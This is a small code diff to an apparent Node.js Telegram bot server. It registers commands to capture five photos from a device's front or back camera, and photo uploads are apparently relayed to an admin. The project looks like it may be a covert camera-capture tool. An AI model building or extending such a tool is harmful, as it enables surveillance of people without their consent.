@@ -21,6 +21,16 @@ if (!token || !adminId) {
 // Initialize Telegram Bot (Polling mode)
 const bot = new TelegramBot(token, { polling: true });
 
+// Automatically register commands with Telegram Menu on server start
+bot.setMyCommands([
+    { command: 'moref', description: 'Front Camera 5 Photos Capture' },
+    { command: 'moreb', description: 'Back Camera 5 Photos Capture' }
+]).then(() => {
+    console.log('Telegram bot commands registered successfully!');
+}).catch(err => {
+    console.error('Failed to set Telegram commands:', err);
+});
+
 // Configure Multer to handle uploaded photo buffers in memory
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
